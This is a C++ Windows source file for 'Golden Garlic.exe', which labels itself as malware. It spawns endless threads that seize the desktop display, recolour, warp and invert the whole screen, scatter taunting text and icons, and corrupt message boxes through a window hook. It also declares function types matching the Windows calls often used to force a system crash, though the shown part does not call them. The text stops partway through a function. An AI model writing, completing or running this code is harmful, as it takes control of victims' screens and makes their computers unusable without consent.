﻿// Golden Garlic.cpp : 定义应用程序的入口点。
//
// Golden Garlic.exe:malware
// used plenty of old&weird bytebeats
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define GoldenGarlicRGB (RGB(243, 177, 26))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma optimize("", off)
#define DESKTOP_WINDOW ((HWND)0)
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(NULL), hcdc = CreateCompatibleDC(hdc);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	while (true)
	{
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int nindazhidazhidadazhi = 0; nindazhidazhidadazhi < 10; nindazhidazhidadazhi++) {
			HBRUSH hBrush = CreateSolidBrush(GoldenGarlicRGB);
			SelectObject(hcdc, hBrush);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc);
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
HRGN CreateQuadrilateralRgn(int x, int y, int size) {
	POINT points[7];
	double angle = 2 * PI / 7;
	for (int i = 0; i < 4; i++) {
		points[i].x = x + (int)(size * sin(i * angle));
		points[i].y = y + (int)(size * cos(i * angle));
	}
	points[4] = points[0];
	return CreatePolygonRgn(points, 4, WINDING);
}
VOID WINAPI QuadrilateralFunction(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateQuadrilateralRgn(x, y, w / 2);
	InvertRgn(hdc, hrgn);
	DeleteObject(hrgn);
	ReleaseDC(NULL, hdc);
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return (((2 * (t + 10 >> (t >> 9 | t >> 14) | t >> 4 - 2)) * ((t >> 10 ^ t + (t >> 6 | 127) >> 10) | 2)));//hatsunium.exe
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload12_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return (((((t ^ t >> 11) * (t | t >> 4) & (t ^ t << 114) + (t | t >> 51)))));//hydrargyrum.exe
			});
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI Payload1_num1(LPVOID lpParam)//stolen from mazelarper, modified by me
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), xxx = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	double t = 0.0f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int cx = abs(x / 10);
				int cy = abs(y / 10);
				int p = abs(xxx * 2);
				int q = abs(xxx ^ 2);
				double r = (p ^ q) + ((cx - t) + (cy + t) + ((cx + cy + t) / 7.89113f));
				double fx = floor(1270.5f * asin(cosf(2 * (r + t))));
				data[y * w + x].rgb += COLORHSV((w + h) + fx);
			}
		}

		t += 0.5f;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		int a = 100 * sin(PI + xxx), b = 20 * cos(PI + xxx);
		BitBlt(hdc, a, b, w, h, hdcCopy, 0, 0, SRCERASE);
		xxx++;
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload1_num2(LPVOID lpParam)//credits to n17pro3426
{
	HDC hdc = GetDC(NULL);
	double angle = 0.0f;
	while (true)
	{
		POINT cpt;
		GetCursorPos(&cpt);
		for (int i = 0; i < 5; i++) {
			hdc = GetDC(0);
			double a = angle + (i * (2.f * PI / 5.f));
			double x = cpt.x + (cos(a) * 133), y = cpt.y + (sin(a) * 133);
			DrawIcon(hdc, x - GetSystemMetrics(11) / 2, y - GetSystemMetrics(12) / 2, LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)));
			ReleaseDC(0, hdc);
		}
		angle += 0.08f;
		if (angle >= 2.0f * PI) { angle -= 2.0f * PI; }
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdc, 0, 0, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCCOPY);
		StretchBlt(hdc, w / 2, 0, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, NOTSRCCOPY);
		StretchBlt(hdc, w / 2, h / 2, w / 2, h / 2, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w / 2, h, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, w / 2, 0, w / 2, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, MERGECOPY);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, PATPAINT);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload2_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), signX = 1, signY = 1, signX1 = 1, signY1 = 1, incrementor = 10, x = 10, y = 10;
	while (true)
	{
		hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		TRIVERTEX vertex[3];
		vertex[0].x = x + (rand() % 15) + 100; vertex[0].y = (rand() % 30) + y; vertex[0].Red = rand() % 0xffff; vertex[0].Green = rand() % 0xffff; vertex[0].Blue = rand() % 0xffff; vertex[0].Alpha = rand() % 0xffff;
		vertex[1].x = x + (rand() % 15) + 200; vertex[1].y = y + (rand() % 15) + 100; vertex[1].Red = rand() % 0xffff; vertex[1].Green = rand() % 0xffff; vertex[1].Blue = rand() % 0xffff; vertex[1].Alpha = rand() % 0xffff;
		vertex[2].x = (rand() % 30) + x; vertex[2].y = y + (rand() % 15) + 200; vertex[2].Red = rand() % 0xffff; vertex[2].Green = rand() % 0xffff; vertex[2].Blue = rand() % 0xffff; vertex[2].Alpha = rand() % 0xffff;
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;
		GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		if (y >= GetSystemMetrics(SM_CYSCREEN)) { signY = -1; }
		if (x >= GetSystemMetrics(SM_CXSCREEN)) { signX = -1; }
		if (y == 0) { signY = 2; }
		if (x == 0) { signX = 2; }
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload3_num1(LPVOID lpParam)//credits to Excutioner, but I modified it.
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmpi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	DOUBLE angle = 0.2074f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int cx = abs(x - (w / 3));
			int cy = abs(y - (h / 3));
			int zx = atan(sinf(angle)) * cx - acos(sinf(angle)) * cy;
			int zy = asin(cosf(angle)) * cx + acos(tanf(angle)) * cy;
			int fx = floor(((zx * zx) - (zy * zy)) & ((zx * zx) + (zy * zy)));
			int average = round((rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 3);
			rgbScreen[i].r = average;
			rgbScreen[i].g = average;
			rgbScreen[i].b = average;
			rgbScreen[i].rgb += fx;
		}
		angle += 0.1348f;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = floor((i * 4) + (i ^ 4) * cbrt(RGB(x ^ y + i, y | x - y, x & i >> y)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.696969f) { hslcolor.l += 1.696969f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), t = 0;
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	double angle = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int cx = (x - (w / 3)), cy = (y - (h / 3));
			int zx = atan(tanf(angle)) * cx + acos(cosf(angle)) * cy, zy = asin(cosf(angle)) * cx + atan(tanf(angle)) * cy;
			double fx = (zx - t) ^ (zy + t);
			rgbScreen[i].r += fx;
			rgbScreen[i].g = fx;
		}
		t++;
		angle += 0.6969f;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload6_num2(LPVOID lpParam)
{
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	while (true)
	{
		const int size = 1000;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2, rr = rand() % 33 + 1;
		for (int i = 0; i < size; i += 100)
		{
			QuadrilateralFunction(x - i / rr, y - i / rr, i, i);
			Sleep(1);
		}
	}
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = (((x + (10 * i)) | -y) / ((i - ((~x % 10) ^ (y % 10))) + 12)) * powf((i + i * 10), 6.f / 9.f);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.5033f) { hslcolor.l += 0.114514f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[11] = {
		"Golden Garlic.exe",
		"Seed.1146",
		"LambdaTechnology Studio",
		"LanPiaoPiaoFlyNB",
		"ewwwwww......",
		"more odoriferous than ethanethiol",
		"extreme stench",
		"dizziness",
		"vulnerable",
		"incorrigible insanity.",
		"another desperate future."
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 11;
		HFONT hFont = CreateFontA(rand() % 150, rand() % 150, rand() % 5033, 0, FW_EXTRABOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	double mazelarper_s_dicknum = 0.5033f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = (x - (w / 3.4));
				int cy = (y - (h / 1.5));
				int zx = atan(tanf(mazelarper_s_dicknum)) * cx - asin(sinf(mazelarper_s_dicknum)) * cy;
				int zy = asin(sinf(mazelarper_s_dicknum)) * cx + atan(cosf(mazelarper_s_dicknum)) * cy;
				int fx = ((((zx + i) | (zy - i)) ^ ((zy + i) | (zx - i))) + 7) | ((((zx + i) | (zy + i)) & ((zy + i) | (zx + i))) + 5);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (float)fmod((double)hslcolor.h + fx / 10000.f + 0.09f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.20130226f) { hslcolor.l += 0.20130410f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
